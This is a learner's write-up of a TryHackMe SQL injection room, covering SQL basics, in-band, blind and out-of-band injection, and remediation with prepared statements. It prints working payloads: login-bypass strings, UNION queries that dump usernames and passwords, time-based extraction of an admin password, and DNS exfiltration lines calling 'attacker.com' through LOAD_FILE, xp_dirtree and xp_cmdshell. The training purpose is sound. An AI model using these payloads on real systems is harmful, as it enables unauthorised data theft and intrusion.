**TryHackMe Room:** [SQL Injection Introduction](https://tryhackme.com/room/sqlinjectionintroduction)

This write-up covers my understanding of the room and the key concepts I took away from it.

# SQL Injection Introduction

SQL Injection (SQLi) is a very famous web vulnerability. I have heard of this since i started using Linux back in university. And i was very familiar (just familiar) with the tool called `sqlmap` from Kali, but I didn't use the tool at all, nor I tried to learn about the vulnerability back then. From what I heard back then, I used to think SQLi is a command line injection to databases, so that the attackers would able to gain unauthorized access to sensitive data.

But now, years later, I am learning the concept and getting hands on it on TryHackMe.

## SQL Essentials for Injections

### SQL Comments

There are two ways you can put comments on `SQL`. `--` and `/* */`.  The former is used for quick and easy one-liner comment whereas you can use the latter for both one-liner and for multiple lines.

For example, here is a normal code:

```sql-text
SELECT * FROM users WHERE username='INPUT' AND password='secret';
```

And here is the same code with comment in the middle:

```sql-text
SELECT * FROM users WHERE username='admin'-- AND password='secret';
```

The commands after `--` is commented out so they are ignored.

### UNION

```sql-text
SELECT name, email FROM users UNION SELECT id, name FROM admins; 
```

And it will return name and email from `users` table and id and name from `admins` table and show them as total result.

### LIKE And Wildcards

```sql-text
SELECT * FROM users WHERE username LIKE "adm%";
```

The returns would be users with the username `adm` at the beginning like admin, administrator, etc.

### LIMIT

```sql-text
SELECT name FROM users LIMIT 1;
SELECT name FROM users LIMIT 2, 1;
```

The first one will show only the first row of the table. The second one will skip the first two rows and show the third one.

### String Functions

1. `group-concat()`

```sql-text
SELECT group_concat(username, ':', password SEPARATOR '<br>') FROM users;
```

It will return something like `admin:pass123<br>martin:secret<br>jim:work456`.

2. `CONCAT()`

```sql-text
SELECT CONCAT(username, ':', password) FROM users;
```

It will return something like `admin:pass123`.

And there is also `informatino_schema` database which is a database that contains information about other databases. Every database has it. And two tables from the `information_schema` database are useful.

- `information_schema.tables` lists every tables.
- `information_schema.columns` lists every columns.

## What is SQL Injection?

So, how does SQL injection work? And what is it exactly? Is there a magic code that lets you access unauthorized data? Well, I used to think so. I used to think, you are in a database, and you enter a magic code or codes, and then it will automatically open the tables for you. But it doesn't work like that.

So, in a normal article website, when you select an article like this `https://website.thm/article?id=1,`, behind the scene, the SQL translates this to:

```sql-text
SELECT * FROM articles WHERE id = 1 AND public = 1;
```

But here is where the vulnerability happens when building the query by directly concatenating user input directly into the SQL string, like this:

```php
$query = "SELECT * FROM articles WHERE id = " . $_GET['id'] . " AND public = 1;";
```

So, whatever id you select, becomes part of the SQL query. And you can manipulate it in this way:

```sql-text
SELECT * FROM articles WHERE id = 1 OR 1=1-- AND public = 1;
```
This means get everything from the table named `articles` where one or both these clauses are true `id=1`, `1=1`. So, we all know that `1=1`, so, the result would include everything from the table `articles` even when it's not public because the public part is commented out.

There are three types of SQL injections:

- In-Band SQL Injection
- Blind SQL Injection
- Out-of-Band SQL Injection

Here are the basic commands to detect SQL injection

- `'`
- `"`
- `;--`
- `OR 1=1` (or `OR 1=1;`)

But not every website or database will be set to return errors, you have to check them yourself.

## In-Band SQL Injection

### Error-Based SQL Injection

This one is easy. You just put one of the common SQL injection detecting commands (like `'`), and then it will returns something like this:

```sql-error
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' at line 1
```

### Union-Based SQL Injection

For this, you just add `UNION SELECT` at the end of the original `SELECT` command. And these below steps go in order, step by step. Like trying one by one, until it works. And even in each step, there are multiple micro steps, you have to try that one by one too, until it works.

1. Determining the number of columns

Example:

```sql-text
1 UNION SELECT 1          -- error (wrong column count)
1 UNION SELECT 1,2        -- error (still wrong)
1 UNION SELECT 1,2,3      -- success! The table has 3 columns
```

2. Identifying which columns to display

Example:

```sql-text
0 UNION SELECT 1,2,3
```

3. Extract the database name

Example: 

```sql-text
0 UNION SELECT 1,2,database()
```

4. Enumerating tables

Example:

```sql-text
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name'
```

5. Enumerating columns

Example: 

```sql-text
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'
```

6. Extracting data

Example: 

```sql-text
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table
```

## Blind SQL Injection: Authentication Bypass

Blind SQL injection is when you have no output or feedback when trying out normal SQL injection techniques. Normally, here is how authentication queries work:

```sql-text
SELECT * FROM users WHERE username='bob' AND password='secret123' LIMIT 1;
```

When you put in `' OR 1=1;--` to the username field, it will become this in the background:

```sql-text
SELECT * FROM users WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1;
```

So, what's happening is:

- `username=''` - It will check a condition where username is nothing, or there is no username
- `OR 1=1` - A condition where 1 is equal to 1, which is always true
- `;` - Ends the statement, (I often forget the semicolon when writing SQL queries)
- `--` - Comment out the next word

So basically, it is selecting everything from the `users` table where the username is `''` (nothing) or 1 is equal to 1, and it has commented out the password field.

And you can target specific user too, like admin, with this `admin'--`. Here is the example:

```sql-text
SELECT * FROM users WHERE username='admin'--' AND password='anything' LIMIT 1;
```

The `' OR 1=1;--` is not the only payload you can try, you can try multiple ones when detecting SQL injection. Here they are:

- `' OR 1=1;--` - This is the classic one.
- `' OR 1=1#` - `#` as the comment character instead of `--`.
- `" OR 1=1--` - Double quote `"` instead of `'`.
- And trying both username and password fields.Some applications only concatenate only one of them.

## Blind SQL Injection: Boolean and Time Based

These techniques are useful when you want to pull the actual data but the application gives you no visible output. This one is even more tedious than the other ones, because you have to try one character at a time to check if it works.

## Boolean-Based Blind SQL Injection

This is a true or false detection. For example, there is a feature that checks username in a website like `https://website.thm/checkuser?username=admin`, and it will return in true or false in JSON format like `{taken: true}` or `{taken: false}`. Here is a step by step guide:

1. Confirming injection 

```sql-text
SELECT * FROM users WHERE username = 'admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';-- LIMIT 1;
```
This will return true since `%` is a wildcard that matches every database, so it will return `{taken: true}`.

2. Confirming the database name. 

```sql-text
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
```

You have to guess the name character by character by replacing the wildcard with specific letter, like `s%`, `sa%`, `sq%`, etc.

3. Getting the table and column name.

```sql-text
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'a%';--
```

You have to guess the table name too. But many names are common. You can try those first. And at the end `users%` returns `true`, you can try without the wildcard to confirm if the table name `users` actually exist. 

## Time-Based Blind SQL Injection

This is useful when there is absolutely no visible output, not even boolean. When your signal is only seeing how long the response takes. There is a `SLEEP()` function in MYSQL that pauses execution for a set of number of seconds, wraps a condition around it and the database only pauses it when the condition is true.

Here are some examples:

```sql-text
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
```

If the database name starts with `s`, then the response would take for 5 seconds.

Here is another one:

```sql-text
admin123' UNION SELECT SLEEP(5);--        -- no delay (wrong count)
admin123' UNION SELECT SLEEP(5),2;--      -- 5 second delay (2 columns!)
```

You have to try it one by one like in Union-based detection, until you get the right response.

Here is the scenario from the practical lab (from the task 6):

1. Finding the column count. 

```sql-text
admin123' UNION SELECT SLEEP(5);--
```

```sql-text
admin123' UNION SELECT SLEEP(5), 2;--
```

2. Getting the database name. You have to start from the beginning, or guess it.

```sql-text
admin123' UNION SELECT SLEEP(5),2 where database() like 's%';--
```

```sql-text
admin123' UNION SELECT SLEEP(5),2 where database() like 'sq%';--
```

```sql-text
admin123' UNION SELECT SLEEP(5),2 where database() like 'sqli_four';--
```

3. Enumerating the database names and columns.

```sql-text
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'u%';--
```

```sql-text
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'us%';--
```

```sql-text
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'users';--
```

4. Extracting the admin password.

```sql-text
admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '4%';--
```

```sql-text
admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '49%';--
```

```sql-text
admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '4961';--
```

## Out-of-Band SQL Injection

This one is used when everything else has failed. But for out-of-band (OOB) SQL injection to work, the database server should be able to make outbound connection. 

There are two channels involved:

- The attacker channel where you send the normal SQL payloads
- The data channel where the database server makes the outbound connection to your server

## DNS Exfiltration With MySQL

The most common OOB trick for MySQL uses LOAD_FILE() to trigger a DNS lookup. Here is the example:

```sql-text
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
```

- `SELECT database()` pulls the database name, in this scenario, it's `webapp_db`.
- `CONCAT ()` builds or concatenate the string, like `\\webapp_db.attacker.com\share`.
- `LOAD_FILE()` reads the file path.

## MSSQL Techniques

Microsoft SQL Server has a direct method, with `xp_dirtree`. Example:

```sql-text
EXEC master..xp_dirtree '\\attacker.com\share';
```

`xp_cmdshell` (if it is enabled) runs OS commands directly

```sql-text
EXEC xp_cmdshell 'nslookup data.attacker.com';
```

## Remediation and Prevention

## Prepared Statements (Parameterized Queries)

**Vulnerable PHP code:**

```php
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";
$result = mysqli_query($conn, $query);
```

**Fixed with prepared statements (PDO):**

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);
$result = $stmt->fetchAll();
```
The `?` is a placeholder. Even when you put in `' OR 1=1; --`, it will put it in a string.
 
**Vulnerable Python code:**
 
```python
 query = f"SELECT * FROM users WHERE username='{username}'"
cursor.execute(query)
```

**Fixed Python code:**

```python
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

`%s` is a parameter placeholder and MySQL will handle the escaping and binding. 

The other ways you can prevent SQL injection are:

### Input Validation

It controls the web input in the application before anything reaches to the database. Allowlisting defines exactly what is valid and rejects everything else. If a parameter is an numeric ID, you should check it with:

```php
if (!ctype_digit($_GET['id'])) {
    die("Invalid input");
}
```

There is also Blocklisting which blocks characters like `'` or `--`. But attackers can find ways around it. You have to use the validation alongside prepared statements.

### Escaping User Input

Escaping means putting `\` to inputs. So, `'` becomes `\'`. It can stop basic injection but it is also fragile, and database specific. You should use this as last resort.

### Principle of Least Privilege

This is a good principle to protect it. What it means is adding bare minimum permissions:

- If the application is read-only, then it will get `SELECT` privileges and nothing else
- No one can connect as `root` or `sa` through application
- Locking down tables that contain sensitive data

### Web Application Firewalls (WAFs)

This, as per my understanding is setting up firewall rules. Like if the firewall detects `' OR 1=1`, `UNION SELECT`, `information_schema`, then it will raise an alert. Or, it will block known attack patterns.

## Practical

The practical lab of this room is pretty straightforward, and there is a step by step guide on the room itself. So, I won't be including this.

## Conclusion

Back in my coding days, writing `$_GET['username']` or `$_GET['id']` used to give me a satisfactory feeling, because I just learned how to add all the numbers or all the usernames through single variable (is it a variable?). But I did learn back then, that it was not a good coding practice, and it is prone to SQL injection. And I did heard of SQL injection back then, but I didn't know how it worked or how declaring, or writing like that would make the web/database vulnerable. But now, I do. 
